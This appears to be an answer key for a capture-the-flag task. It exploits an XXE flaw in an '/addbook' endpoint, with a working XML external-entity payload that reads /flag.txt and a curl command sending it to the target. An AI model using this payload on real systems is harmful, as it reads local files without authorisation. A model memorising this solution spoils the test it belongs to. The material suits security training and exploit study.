# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: XXE injection. `/addbook` parses attacker XML with external-entity
resolution enabled and reflects the parsed document back, so a `SYSTEM` entity
reading a local file is inlined into the response.

1. **Submit XML with an external entity** reading the flag file:

   ```
   XML='<?xml version="1.0"?><!DOCTYPE book [<!ENTITY xxe SYSTEM "file:///flag.txt">]><book>&xxe;</book>'
   curl -s "http://<target>/addbook" --data-urlencode "xml=$XML"
   ```

2. **Extract the flag** (`FLAG{...}`) from the reflected document and report it
   verbatim.
